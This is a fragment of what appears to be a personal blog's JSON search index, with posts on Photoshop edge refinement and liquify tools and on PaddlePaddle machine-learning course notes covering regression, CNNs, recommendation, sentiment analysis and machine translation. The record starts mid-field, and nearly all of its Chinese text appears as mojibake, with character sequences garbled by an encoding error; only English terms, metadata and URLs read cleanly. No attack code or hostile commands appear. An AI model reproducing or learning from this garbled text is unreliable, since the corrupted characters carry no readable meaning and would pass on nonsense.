è°ƒæ•´è¾¹ç¼˜ï¼Œå…¶å®å°±æ˜¯æŠ½å‡ºæ»¤é•œè¿›åŒ–ç‰ˆ æ™ºèƒ½åŠå¾„ä¿ç•™ å¹³æ»‘ 1-3 å³å¯ ç¾½åŒ– 1åƒç´  å¯¹æ¯”åº¦ ç¨å¾®ç»™ç‚¹ 11% ç§»åŠ¨è¾¹ç¼˜ 0 å‡€åŒ–é¢œè‰² å‹¾é€‰ è¾“å‡ºä¸ç”¨æ›´æ”¹ è®°ä½é…ç½®å³å¯ è¾¹ç¼˜æ¸…æ™°å¯è§ï¼Œä½¿ç”¨é’¢ç¬”æŠ å›¾ æ¶²åŒ–æ»¤é•œå‘å‰å˜å½¢å·¥å…· å¯†åº¦å»ºè®®ä¸è¦å¤ªå¤§ï¼Œè€å¿ƒæ“ä½œ ç¬”è§¦å»ºè®®å¤§ä¸€ç‚¹ åœ¨é«˜çº§æ¨¡å¼ä¸‹è°ƒæ•´å‹åŠ›å¤§å°ï¼Œå‹åŠ›è¶Šå¤§æ‹–ä½çš„ç»“æœè¶Šå°–é” é‡å»ºå·¥å…· å¯¹äºä¸å¤ªæ»¡æ„çš„ç»“æœéƒ¨åˆ† è¤¶çš±å·¥å…· å‘¨å›´å‘ä¸­å¿ƒè¿›è¡ŒæŒ¤å‹ï¼Œç˜¦èº«çš„æ“ä½œ è†¨èƒ€å·¥å…· ç”¨äºæ”¾å¤§çœ¼ç›ï¼Œéš†èƒ¸ç­‰ å†»ç»“ä¸è§£å†»å·¥å…· æ–‡å­—æ•ˆæœåˆ¶ä½œç½‘ç‚¹æ–‡å­—æ–°å»ºæ–‡ä»¶å°ºå¯¸ 800*800 è¾“å…¥æ–‡å­— å¤§å°","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"paddlepaddle çº¿æ€§å›å½’é¢„æµ‹æˆ¿ä»·","slug":"history/tech/59ca5038c51d80451db0c010","date":"2017-09-26T01:03:52.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59ca5038c51d80451db0c010/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59ca5038c51d80451db0c010/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä¸‰ç§æ¢¯åº¦ä¸‹é™ç®—æ³•","slug":"history/tech/59ca22c5c51d80451db0c00f","date":"2017-09-25T21:49:57.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59ca22c5c51d80451db0c00f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59ca22c5c51d80451db0c00f/","excerpt":"","text":"http://bit.baidu.com/course/detail/id/137.htmlè¿™é‡Œ a æ˜¯è¶…å‚æ•°","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ åŸºç¡€çŸ¥è¯†","slug":"history/tech/59ca183bc51d80451db0c00e","date":"2017-09-25T21:04:59.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59ca183bc51d80451db0c00e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59ca183bc51d80451db0c00e/","excerpt":"","text":"åŸºæœ¬æ¦‚å¿µæœºå™¨å­¦ä¹ æ˜¯ä»æ•°æ®ä¸­äº§ç”Ÿæ¨¡å‹çš„è¿‡ç¨‹ã€‚æ¨¡å‹çš„èƒ½åŠ›ï¼šæ‹Ÿåˆï¼šæè¿°å·²æœ‰æ•°æ®ä¹‹é—´çš„æ˜ å°„å…³ç³» é¢„æµ‹ï¼šå¯¹æœªçŸ¥æ•°æ®æœ‰é¢„æµ‹èƒ½åŠ›(æ³›åŒ– generalization) å‡è®¾å‡½æ•°ï¼šç”¨æ¥æè¿°ä¸¤ä¸ªæ•°æ®ä¹‹é—´çš„æ˜ å°„å…³ç³» æŸå¤±å‡½æ•°ï¼šç”¨æ•°å­¦çš„æ–¹æ³•è¡¡é‡å‡è®¾å‡½æ•°é¢„æµ‹ç»“æœä¸çœŸå®å€¼ä¹‹é—´çš„&quot;è¯¯å·®&quot; è¶…å‚æ•°ï¼šéœ€è¦äººä¸ºç¡®å®šçš„å‚æ•° æœºå™¨å­¦ä¹ åˆ†ç±»ï¼šç›‘ç£å­¦ä¹ : åˆ†ç±»ï¼š å†³ç­–æ ‘ï¼š decision tree svm å›å½’ï¼š çº¿æ€§å›å½’ï¼š linear Regression éçº¿æ€§å›å½’ï¼š GBRT æ— ç›‘ç£å­¦ä¹ : èšç±»ï¼š clustering è¯åµŒå…¥ï¼š word embeding é—®é¢˜å»ºæ¨¡ï¼šå‡è®¾å‡½æ•°(hypothesis function): çº¿æ€§å‡è®¾å‡½æ•° ç¥ç»ç½‘ç»œ æŸå¤±å‡½æ•°(cost function): å‡æ–¹å·®(mean square error) äº¤å‰ç†µ(cross entropy) ä¼˜åŒ–ç®—æ³•(æ¢¯åº¦ä¸‹é™ gradient descent): ä¸‰ç§ä¼˜åŒ–æ¡†æ¶: BGD SGD MBGD å¤šç§ä¼˜åŒ–ç®—æ³•: Momentum Adadelta Adam Adagrad ä¸‰ç§æ¢¯åº¦ä¸‹é™ç®—æ³•http://bit.baidu.com/course/detail/id/137.htmlè¿™é‡Œ a æ˜¯è¶…å‚æ•° çº¿æ€§å›å½’é¢„æµ‹æˆ¿ä»·çº¿æ€§å›å½’ä¼˜ç‚¹ï¼šå½¢å¼ç®€å•ï¼Œæ˜“äºå»ºæ¨¡ åŒæ—¶è•´å«ç€æœºå™¨å­¦ä¹ ä¸­ä¸€äº›é‡è¦çš„åŸºæœ¬æ€æƒ³ å¯æ¼”å˜æˆå…¶ä»–å¤æ‚æ¨¡å‹ è®¸å¤šåŠŸèƒ½å¼ºå¤§çš„éçº¿æ€§æ¨¡å‹(nonlinear model)å¯åœ¨çº¿æ€§æ¨¡å‹åŸºç¡€ä¸Šæ¼”å˜è€Œæ¥ã€‚ å¯è§£é‡Šæ€§å¥½ æƒé‡å¯ä»¥è¡¨è¾¾å„å±æ€§åœ¨é¢„æµ‹ä¸­çš„é‡è¦æ€§ï¼Œå› æ­¤çº¿æ€§æ¨¡å‹æœ‰å¾ˆå¥½çš„å¯è§£é‡Šæ€§ã€‚ æœ¯è¯­ï¼šç›‘ç£å­¦ä¹ (supervised learning) éç›‘ç£å­¦ä¹ (unsupervised learning) å‡è®¾å‡½æ•°(hypothesis function) å‡æ–¹å·®(mean square error) æŸå¤±å‡½æ•°(cost function) æ¢¯åº¦ä¸‹é™(gradient descent) æ•°æ®é›†æ“ä½œ paddle.dataset/paddle.reader å…¨è¿æ¥å±‚ paddle.layer.fc() çº¿æ€§æ¿€æ´»å‡½æ•° paddle.activation.Linear() å‡æ–¹å·®æŸå¤±å‡½æ•° paddle.layer.mse_cost() å‚æ•°ä¼˜åŒ–å™¨ paddle.optimizer.Momentum() æ¢¯åº¦ä¸‹é™è®­ç»ƒå™¨ paddle.trainer.SGD() æ•°å­—è¯†åˆ«å…¨è¿æ¥ æ¿€æ´»å‡½æ•° å·ç§¯ æ± åŒ– Softmax å›å½’æ¨¡å‹ å¤šå±‚æ„ŸçŸ¥å™¨æ¨¡å‹ å·ç§¯ç¥ç»ç½‘ç»œæ¨¡å‹ æ•°æ®é›†ï¼šMNIST æ‰‹å†™å¼€æºæ•°æ®é›†(6ä¸‡è®­ç»ƒï¼Œ1ä¸‡æµ‹è¯•) é‡è¦çš„ç§¯æœ¨å…¨è¿æ¥(fully connected): æ¯ä¸€ä¸ªç¥ç»å…ƒéƒ½å’Œä¸Šä¸€å±‚æ‰€æœ‰ç¥ç»å…ƒç›¸è¿ã€‚ æ¿€æ´»å‡½æ•°(activation function) å·ç§¯(convolution) æ± åŒ–(pooling) åˆ†ç±»å™¨softmax å›å½’æ¨¡å‹ å¤šå±‚æ„ŸçŸ¥æœºæ¨¡å‹ å·ç§¯ç¥ç»ç½‘ç»œ å…¨è¿æ¥ç¥ç»ç½‘ç»œçš„ç¼ºç‚¹ï¼šå‚æ•°å¤ªå¤š æ²¡æœ‰åˆ©ç”¨åƒç´ ä¹‹é—´çš„ä¿¡æ¯ ä¸ºä»€ä¹ˆè¦ç”¨æ¿€æ´»å‡½æ•°ï¼šç¥ç»ç½‘ç»œæ¯å±‚è¾“å‡ºéƒ½æ˜¯ä¸Šå±‚è¾“å…¥çš„çº¿æ€§å˜åŒ–ã€‚ y = Wx æ— è®ºç¥ç»ç½‘ç»œæœ‰å¤šå°‘å±‚ï¼Œè¾“å‡ºéƒ½æ˜¯è¾“å…¥çš„çº¿æ€§ç»„åˆ å¼•å…¥éçº¿æ€§æ¿€æ´»å‡½æ•°ï¼Œç¥ç»ç½‘ç»œæ‰å¯ä»¥é€¼è¿‘ä»»æ„å‡½æ•° y = f(Wx) softmax å›å½’æ¨¡å‹ï¼šå¸¸ç”¨äºç¥ç»ç½‘ç»œè¾“å‡ºå±‚çš„å¤šåˆ†ç±» å¯¹äºNä¸ªç±»åˆ«çš„å¤šåˆ†ç±»é—®é¢˜ï¼Œå°†ç»“æœå‘é‡å½’ä¸€åŒ–ä¸º N ä¸ª [0,1] èŒƒå›´å†…çš„å®æ•°å€¼ æ¯ä¸ªå®æ•°å€¼å¯¹åº”ä¸€ä¸ªç±»åˆ«çš„é¢„æµ‹æ¦‚ç‡ æ­¥éª¤ï¼šå°†è¾“å…¥å±‚ç»è¿‡å…¨è¿æ¥å¾—åˆ°çš„ç‰¹å¾ é€šè¿‡softmax æ¿€æ´»å‡½æ•°è¿›è¡Œåˆ†ç±»è¾“å‡º ReLu æ¿€æ´»å‡½æ•°çš„æ¢¯åº¦ï¼ˆå€’æ•°å›¾ï¼‰ï¼šx &lt; 0, æ¢¯åº¦ä¸º 0 x &gt; 0, æ¢¯åº¦ä¸º 1 å¤šå±‚æ„ŸçŸ¥å™¨æ¨¡å‹è®¡ç®—æ–¹æ³•ï¼š å°†è¾“å…¥å±‚è¿ç»­ç»è¿‡ä¸¤ä¸ªå…¨è¿æ¥éšå±‚ ç»è¿‡è¾“å‡ºå±‚ softmax å‡½æ•°è¿›è¡Œåˆ†ç±» å·ç§¯(Convolution)å·ç§¯æ˜¯å·ç§¯ç¥ç»ç½‘ç»œçš„æ ¸å¿ƒåŸºçŸ³ï¼Œ å·ç§¯æ“ä½œå¯ä»¥æå–å‡ºå›¾åƒä½çº§åˆ°é«˜çº§çš„ç‰¹å¾ æ»¤æ³¢å™¨(ä¹Ÿç§°ä½œå·ç§¯æ ¸) ä¸äºŒç»´å›¾åƒåšå·ç§¯æ“ä½œæ¥æå–ç‰¹å¾ å·ç§¯æ“ä½œè¢«å¹¿æ³›åº”ç”¨äºå›¾åƒå¤„ç†é¢†åŸŸï¼Œ ä¸åŒå·ç§¯æ ¸å¯ä»¥æå–ä¸åŒçš„ç‰¹å¾ï¼Œå¦‚è¾¹æ²¿ï¼Œçº¿æ€§ï¼Œè§’ç­‰ç‰¹å¾ã€‚ å·ç§¯æ ¸æ»‘åŠ¨åˆ°äºŒç»´å›¾åƒä¸Šæ‰€æœ‰ä½ç½®ï¼Œå¹¶åœ¨æ¯ä¸ªä½ç½®ä¸Šä¸è¯¥åƒç´ ç‚¹åŠå…¶å‘¨å›´åƒç´ ç‚¹åšå†…ç§¯ åœ¨å·ç§¯å±‚ï¼Œé€šå¸¸é‡‡ç”¨å¤šç»„å·ç§¯æ ¸æå–ä¸åŒç‰¹å¾ï¼Œå³å¯¹åº”ä¸åŒæ·±åº¦åˆ‡ç‰‡çš„ç‰¹å¾ é€šè¿‡å·ç§¯æ ¸ï¼Œä½¿å¾—ä»…ä¸è¾“å…¥ç¥ç»å…ƒçš„ä¸€å—åŒºåŸŸè¿æ¥ï¼Œè¿™å—å±€éƒ¨åŒºåŸŸç§°ä½œæ„Ÿå—é‡ è¿™ç§å±€éƒ¨è¿æ¥ä¿è¯äº†å­¦ä¹ åçš„è¿‡æ»¤å™¨èƒ½å¤Ÿå¯¹äºå±€éƒ¨çš„ç‰¹å¾æœ‰æœ€å¼ºçš„å“åº” å·ç§¯ä¸»è¦ç‰¹æ€§ï¼šå±€éƒ¨è¿æ¥ æ¯ä¸ªç¥ç»å…ƒä»…ä»…ä¸è¾“å…¥ç¥ç»å…ƒçš„ä¸€å—åŒºåŸŸè¿æ¥ï¼Œ å‡å°‘å¾ˆå¤šå‚æ•° æƒé‡å…±äº« ä¸€ç»„è¿æ¥å…±äº«åŒä¸€ä¸ªæƒé‡ï¼Œ è¿™æ ·åˆå‡å°‘äº†å¾ˆå¤šå‚æ•° å·ç§¯å±‚ä½¿å¾—éœ€è¦å­¦ä¹ çš„å‚æ•°å¤§å¤§å‡å°ï¼Œ è¿™æ ·ä¹Ÿæœ‰åˆ©äºè®­ç»ƒè¾ƒå¤§å·ç§¯ç¥ç»ç½‘ç»œ æ± åŒ–(polling)æ± åŒ–æ˜¯éçº¿æ€§ä¸‹é‡‡æ ·çš„ä¸€ç§å½¢å¼ æ± åŒ–åŒ…æ‹¬æœ€å¤§æ± åŒ–ï¼Œå¹³å‡æ± åŒ– æœ€å¤§æ± åŒ–æ˜¯å°†è¾“å…¥åˆ†æˆä¸åŒçš„åŒºåŸŸï¼Œå¯¹äºæ¯ä¸ªåŒºåŸŸçš„æ•°å–æœ€å¤§å€¼ä½œä¸ºè¾“å‡º é€šè¿‡å‡å°‘ç½‘ç»œçš„å‚æ•°æ¥å‡å°è®¡ç®—é‡ èƒ½å¤Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶è¿‡æ‹Ÿåˆ é€šå¸¸åœ¨å·ç§¯å±‚çš„åé¢ä¼šåŠ ä¸Šä¸€ä¸ªæ± åŒ–å±‚è¿›è¡Œä¸‹é‡‡æ · LeNet-5 å·ç§¯ç¥ç»ç½‘ç»œçš„æ¼”ç¤ºç»è¿‡ä¸¤æ¬¡å·ç§¯å±‚åˆ°æ± åŒ–å±‚ ç»è¿‡å…¨è¿æ¥å±‚ + Softmax åˆ†ç±» æ€»ç»“å…¨è¿æ¥ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œå°†å›¾åƒå±•å¼€æˆä¸€ç»´å‘é‡è¾“å…¥åˆ°ç½‘ç»œä¸­ï¼Œå¿½ç•¥äº†å›¾åƒçš„ä½ç½®å’Œç»“æ„ä¿¡æ¯ å·ç§¯ç¥ç»ç½‘ç»œåˆ©ç”¨å·ç§¯å’Œæ± åŒ–ï¼Œèƒ½å¤Ÿæ›´å¥½åœ°åˆ©ç”¨å›¾åƒçš„ç»“æ„ä¿¡æ¯ å·ç§¯ç¥ç»ç½‘ç»œé€šè¿‡å°½å¯èƒ½ä¿ç•™é‡è¦çš„å‚æ•°ï¼Œ é€šè¿‡å»æ‰å¤§é‡ä¸é‡è¦çš„å‚æ•°æ¥è¾¾åˆ°æ›´å¥½çš„å­¦ä¹ æ•ˆæœ å›¾åƒåˆ†ç±»å›¾åƒè¯†åˆ«ï¼šè®¡ç®—æœºå¯¹å›¾åƒè¿›è¡Œå¤„ç†åˆ†æã€è¯†åˆ«ã€ç†è§£ã€‚ å›¾åƒè¯†åˆ«ï¼šè¯†åˆ«å‡ºæ±½è½¦ï¼Œé©¬è·¯ å›¾åƒæ£€æµ‹ï¼šè¯†åˆ«å‡ºæ±½è½¦ä½ç½®ï¼Œè¿›ä¸€æ­¥è¯†åˆ«å‡ºæ‹¥å µç­‰è¯­æ„å›¾åƒåˆ†ç±»æŒ‘æˆ˜ï¼šhttp://cs231n.github.io/classification/ æ¨¡å‹æ¦‚è§ˆï¼šAlexNet VGG GoogleNet ResNet ä¼ ç»Ÿæ–¹æ³•è¡¨ç¤º(å«æœ‰å¤§é‡å†—ä½™å’Œå™ªå£°)åº•å±‚ç‰¹å¾è¡¨ç¤º ---&gt; (è¿›ä¸€æ­¥æ•´åˆåº•å±‚ç‰¹å¾å¾—åˆ°)ä¸­å±‚ç‰¹å¾è¡¨ç¤º ---&gt; åˆ†ç±»å™¨ ä¼ ç»Ÿæ–¹æ³•ç‰¹ç‚¹ï¼šå¤šä¸ªæ­¥éª¤ ï¼ˆéœ€è¦å¤šæ­¥ä¼˜åŒ–ï¼Œå¤šæ­¥ä¼˜åŒ–å°±ä¼šé€ æˆé”™è¯¯çš„ç´¯ç§¯ï¼‰ æ‰‹å·¥è®¾è®¡ç‰¹å¾ï¼Œé€šå¸¸éœ€è¦å¤šç§ç‰¹å¾è¿›è¡Œèåˆ å‘å±•ç¼“æ…¢ å¸¸ç”¨åˆ†ç±»å™¨ï¼šsvm Adaboost å·ç§¯ç¥ç»ç½‘ç»œçš„æ–¹æ³•ï¼šåº•å±‚ç‰¹å¾ ---&gt; ä¸­å±‚ç‰¹å¾ ---&gt; é«˜å±‚(è¯­æ„)ç‰¹å¾ ---&gt; åˆ†ç±»å™¨ ç‰¹ç‚¹ï¼šå­¦ä¹ ç‰¹å¾(ä¸éœ€è¦å¤šä¸ªæ­¥éª¤ï¼Œä¸€æ­¥åˆ°ä½ç«¯åˆ°ç«¯çš„æ–¹æ³•)ç«¯åˆ°ç«¯ç²¾åº¦é«˜è¾ƒå¥½çš„è¿ç§»èƒ½åŠ›å¤§è§„æ¨¡è§†è§‰æŒ‘æˆ˜èµ›http://image-net.org/indexCNN ç§¯æœ¨å›é¡¾å·ç§¯å±‚ å±€éƒ¨é“¾æ¥ æƒé‡å…±äº« è¾“å…¥è¾“å‡ºï¼šï¼ˆNã€Cã€Hã€Wï¼‰å››ç»´æ•°æ®ç»“æ„ N: Batch Size C: Channel H: Height W: Width å…¨è¿æ¥å±‚ æ± åŒ–å±‚ ReLu å‡½æ•° softmax æ€»ç»“ç‰¹å¾è¿ç§»ï¼šå…¶ä»–ç»†ç²’åº¦å›¾åƒåˆ†ç±»: ä½¿ç”¨ ImageNet æ¨¡å‹ finetuneåŒ»ç–—å›¾åƒè¯†åˆ«: ä½¿ç”¨ ImageNet æ¨¡å‹ finetuneä½¿ç”¨ Oxford-flowers/ImageNet æ•°æ®è¿›è¡Œè®­ç»ƒ ä¸ªæ€§åŒ–æ¨èèƒŒæ™¯ä»‹ç» æ¨èç³»ç»Ÿå’Œæœç´¢å¼•æ“çš„åŒºåˆ«: ä¿¡æ¯æ‰¾äººï¼Œè€Œä¸æ˜¯äººæ‰¾ä¿¡æ¯ æ¨¡å‹è®¾è®¡ æ–‡æœ¬å·ç§¯ç¥ç»ç½‘ç»œ LTR: Learn to Rank æ–‡æœ¬å·ç§¯ç¥ç»ç½‘ç»œæ–‡æœ¬è¾“å…¥ =ã€‹ä¸Šä¸‹é—®è¯å‘é‡æ‹¼æ¥ =ã€‹å…¨è¿æ¥å·ç§¯å±‚ =ã€‹ æ± åŒ– =ã€‹è¾“å‡º LTR åŸºæœ¬æ–¹æ³•pointwise æ’åºå¯ä»¥è¢«å»ºæ¨¡ä¸ºåˆ†ç±»ã€å›å½’ç­‰æ¨¡å‹ è¾“å…¥: å•ä¸ªå•†å“çš„ç‰¹å¾å‘é‡ è¾“å‡º: query ä¸æ¯ä¸ªå•†å“çš„ç›¸å…³åº¦ ä¼˜ç‚¹: ç®€å•æ˜“ç”¨ å±€é™æ€§: æœªè€ƒè™‘å•†å“ä¸å•†å“ä¹‹é—´çš„è”ç³» pairwise è¾“å…¥: å…·æœ‰ååºå…³ç³»çš„å•†å“å¯¹ è¾“å‡º: æ¯å¯¹å•†å“çš„åå¥½å€¼(1 æˆ– -1) listwise è¾“å…¥: æŸä¸ª query ä¸‹æ‰€æœ‰å•†å“ è¾“å‡º: æ’å¥½åºçš„åˆ—è¡¨æˆ–æ’åˆ— å¾®è½¯ åˆ˜é“å²©åšå£« è®ºæ–‡æ•°æ®é›†MovieLens ç™¾ä¸‡æ•°æ®é›† 6000 ä½ç”¨æˆ·å¯¹ 4000 éƒ¨ç”µå½±çš„ä¸€ç™¾ä¸‡æ¡è¯„åˆ† ç”¨æˆ·ç‰¹å¾: IDã€æ€§åˆ«ã€ èŒä¸šã€å¹´é¾„ ç”µå½±ç‰¹å¾: IDã€ç±»åˆ«ã€ç”µå½±å åœ°å€ï¼šhttp://files.grouplens.org/datasets/movielens/ml-1m-README.txtä¸ºäº†ç®€åŒ– ï¼Œ PaddlePaddle å¯¹æ•°æ®åšäº†é¢„å¤„ç†https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/dataset/movielens.pyæ¨¡å‹ç»“æ„paddlepaddle æ•°æ®ç±»å‹æ–‡æ¡£åœ°å€http://doc.paddlepaddle.org/develop/doc/api/v2/data.htmlå»¶ä¼¸http://files.grouplens.org/datasets/movielens/ml-latest-README.htmlhttps://www.themoviedb.org/documentation/apié€šè¿‡æ•°æ®é›†ä¸­çš„ç”µå½± ID è°ƒç”¨ api å¾—åˆ°ç”µå½±çš„æµ·æŠ¥ï¼Œä½¿ç”¨ç¥ç»ç½‘ç»œå¯¹æµ·æŠ¥è¿›è¡Œå­¦ä¹ ã€‚ æƒ…æ„Ÿåˆ†ææƒ…æ„Ÿåˆ†æ æ„è§æŠ½å–ï¼Œ æ„è§æŒ–æ˜ è‡ªç„¶è¯­è¨€å¤„ç†ä»»åŠ¡ åˆ¤æ–­ä¸€æ®µæ–‡æœ¬æ‰€è¡¨è¾¾çš„æƒ…ç»ªçŠ¶æ€ æ–‡æœ¬: ä¸€å¥è¯ï¼Œ ä¸€ä¸ªæ®µè½ï¼Œä¸€ä¸ªæ–‡æ¡£ æƒ…ç»ª: æ­£é¢ï¼Œ è´Ÿé¢ æƒ…æ„Ÿåˆ†æä»»åŠ¡ æœ€åŸºæœ¬çš„: ä¸€æ®µæ–‡æœ¬è¡¨è¾¾çš„æ€åº¦æ˜¯æ­£å‘çš„è¿˜æ˜¯è´Ÿå‘ ç¨å¾®å¤æ‚: å°†æ–‡æœ¬è¡¨è¾¾çš„æ€åº¦åˆ†æˆ 1-5 ä¸ªç­‰çº§ æƒ…æ„Ÿåˆ†æåº”ç”¨ ç”µå½±ï¼Œ è´­ç‰©ï¼Œ ç¤¾äº¤ï¼Œ é‡‘èï¼Œ æœºå™¨äºº æ¨¡å‹è®¾è®¡æƒ…æ„Ÿåˆ†ç±»æ–‡æœ¬åˆ†ç±»å¾ªç¯ç¥ç»ç½‘ç»œRNNLSTMæ ˆå¼åŒå‘LSTMæ¨¡å‹è®­ç»ƒRNNæ¨¡å‹è®¡ç®—Batchè®¡ç®—æ–‡æœ¬æƒ…æ„Ÿåˆ†ç±»(é¢å‘æ–‡æœ¬å¤„ç†)åŸºäºæƒ…æ„Ÿè¯å…¸åŠè§„åˆ™åŸºäºæœºå™¨å­¦ä¹ æ–¹æ³•æœ‰ç›‘ç£çš„æœºå™¨å­¦ä¹ å®ç°ç«¯åˆ°ç«¯çš„æƒ…æ„Ÿåˆ†ç±»æ–‡æœ¬åˆ†ç±»æ–‡æ¡£åˆ†ç±»åƒåœ¾é‚®ä»¶è¿‡æ»¤å¾ªç¯ç¥ç»ç½‘ç»œ(Recurrent Neural Network) ä¸Šä¸€æ—¶åˆ»çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€æ—¶åˆ»çš„è¾“å…¥ è‡ªç„¶è¯­è¨€ï¼Œå…¸å‹çš„åºåˆ—æ•°æ®(è¯åºåˆ—) é•¿åºåˆ—é•¿æœŸä¾èµ–(Long Term Dependencies) æ¢¯åº¦æ¶ˆå¤±/æ¢¯åº¦çˆ†ç‚¸ LSTM ç½‘ç»œä¸ºäº†è§£å†³ç®€å• RNN ç½‘ç»œé‡Œé¢çš„é•¿è·ç¦»ä¾èµ–å’Œæ¢¯åº¦æ¶ˆå¤±çš„é—®é¢˜ï¼Œ æœ‰äº† LSTM ç½‘ç»œå¢å¼ºäº†å¤„ç†è¿œè·ç¦»ä¾èµ–é—®é¢˜çš„èƒ½åŠ›ï¼ŒåŒæ—¶ç¼©çŸ­äº†æ¢¯åº¦çš„ä¼ æ’­è·¯å¾„ç±»ä¼¼çš„è®¾è®¡è¿˜æœ‰é—¨æ§å¾ªç¯ç¥ç»ç½‘ç»œå•å…ƒ GRUæ•°æ®é›†IMDB æƒ…æ„Ÿåˆ†ææ•°æ®é›†åˆ†åˆ«åŒ…å«25000è®­ç»ƒæ ·æœ¬å’Œæµ‹è¯•æ ·æœ¬æ ‡æ³¨ä¸ºæ­£é¢è¯„è®ºæˆ–è´Ÿé¢è¯„è®ºdataset/imdb.py è‡ªåŠ¨ä¸‹è½½ è¯»å–å­—å…¸ã€è®­ç»ƒæ•°æ®ã€æµ‹è¯•æ•°æ® API è¯­ä¹‰è§’è‰²æ ‡æ³¨è¯­ä¹‰è§’è‰²æ ‡æ³¨æ˜¯å®ç°æµ…å±‚è¯­ä¹‰åˆ†æçš„ä¸€ç§æ–¹å¼è°“è¯: å¯¹ä¸»è¯­çš„é™ˆè¿°æˆ–è¯´æ˜ï¼Œ é€šå¸¸æ˜¯ä¸€ä¸ªåŠ¨è¯è®ºå…ƒ: è·Ÿè°“è¯æ­é…çš„åè¯è¯­ä¹‰è§’è‰²: è®ºå…ƒåœ¨åŠ¨è¯æ‰€æŒ‡äº‹ä»¶ä¸­æ‹…ä»»çš„è§’è‰²é€šè¿‡è®©è®¡ç®—æœºæå–å‡ºé‡è¦çš„ç»“æ„åŒ–ä¿¡æ¯ï¼Œæ¥&quot;ç†è§£&quot;è¯­è¨€çš„å«ä¹‰ã€‚ä¼ ç»Ÿè§’è‰²æ ‡æ³¨æ–¹æ³•ç¼ºé™· é«˜åº¦ä¾èµ–å¥æ³•åˆ†æ--------&gt;åªåˆ©ç”¨æ–‡æœ¬è¾“å…¥ æ¯ä¸ªæ­¥éª¤çš„é”™è¯¯ä¼šç´¯ç§¯---------&gt;ç«¯åˆ°ç«¯å­¦ä¹ åºåˆ—æ ‡æ³¨ç»“æœ æ€»ç»“æ ˆå¼åŒå‘ LSTM å­¦ä¹ å¥å­è¡¨ç¤º CRFå±‚åœ¨ç‰¹å¾åŸºç¡€ä¸Šå®Œæˆåºåˆ—æ ‡æ³¨ åºåˆ—æ ‡æ³¨è¿˜èƒ½åš: åˆ†è¯ï¼Œ è¯æ€§æ ‡æ³¨ï¼Œ è¯­ä¹‰è§’è‰²æ ‡æ³¨ï¼Œ å‘½åå®ä½“è¯†åˆ« æœºå™¨ç¿»è¯‘ä¸¤ä¸ªå˜é•¿åºåˆ—ä¹‹é—´çš„æ˜ å°„é—®é¢˜ ç«¯åˆ°ç«¯çš„ç¥ç»ç½‘ç»œæœºå™¨ç¿»è¯‘åŸç†åŠç›¸å…³æ¨¡å‹é—¨æ§å¾ªç¯å•å…ƒ(GRU) å’ŒåŒå‘ RNN ç¼–ç å™¨-è§£ç å™¨æ¡†æ¶(Encoder-Decoder) æ³¨æ„åŠ›æœºåˆ¶(Attention) æŸ±æœç´¢ç®—æ³•(Beam Search) æœºå™¨ç¿»è¯‘æ¦‚å¿µè§£é‡Šæºè¯­è¨€: è¢«ç¿»è¯‘çš„è¯­è¨€ ç›®æ ‡è¯­è¨€: ç¿»è¯‘åçš„è¯­è¨€ å¹³è¡Œè¯­æ–™ï¼ˆparallel corpusï¼‰: ä¸€ä¸€å¯¹åº”çš„æº/ç›®æ ‡è¯­è¨€ å®šä¹‰: ç”¨è®¡ç®—æœºæ¥å®ç°ä»æºè¯­è¨€åˆ°ç›®æ ‡è¯­è¨€çš„è½¬æ¢è¿‡ç¨‹ è®­ç»ƒè¿‡ç¨‹: ç”¨å¤§é‡çš„å¹³è¡Œè¯­æ–™ï¼Œæ¥è®­ç»ƒæ¨¡å‹ ç”Ÿæˆè¿‡ç¨‹: æ ¹æ®é¢„å…ˆè®­ç»ƒçš„æ¨¡å‹æ¥ç¿»è¯‘æºè¯­è¨€å¥å­ åŸºäºè§„åˆ™çš„ç¿»è¯‘ç³»ç»Ÿ(æ—©æœŸ)è½¬æ¢è§„åˆ™: ç”±è¯­è¨€å­¦å®¶ç¼–å†™ï¼Œ å†å°†å…¶å½•å…¥è®¡ç®—æœº ç¼ºç‚¹: å¯¹è¯­è¨€å­¦å®¶çš„è¦æ±‚éå¸¸é«˜ï¼Œå‡ ä¹æ— æ³•æ€»ç»“ä¸€é—¨è¯­è¨€ä¼šç”¨åˆ°çš„æ‰€æœ‰è§„åˆ™ï¼Œ æ›´ä½•å†µä¸¤ç§ä»¥ä¸Šçš„è¯­è¨€ã€‚ ç»Ÿè®¡æœºå™¨ç¿»è¯‘(Statistical Machine Translation, SMT)è½¬æ¢è§„åˆ™: ç”±æœºå™¨ä»å¤§è§„æ¨¡è¯­æ–™ä¸­å­¦ä¹ å¾—åˆ° ç¼ºç‚¹: äººä¸ºè®¾è®¡è®¸å¤šç‰¹å¾ï¼Œä½†æ˜¯æ°¸è¿œæ— æ³•è¦†ç›–æ‰€æœ‰è¯­è¨€ç°è±¡ 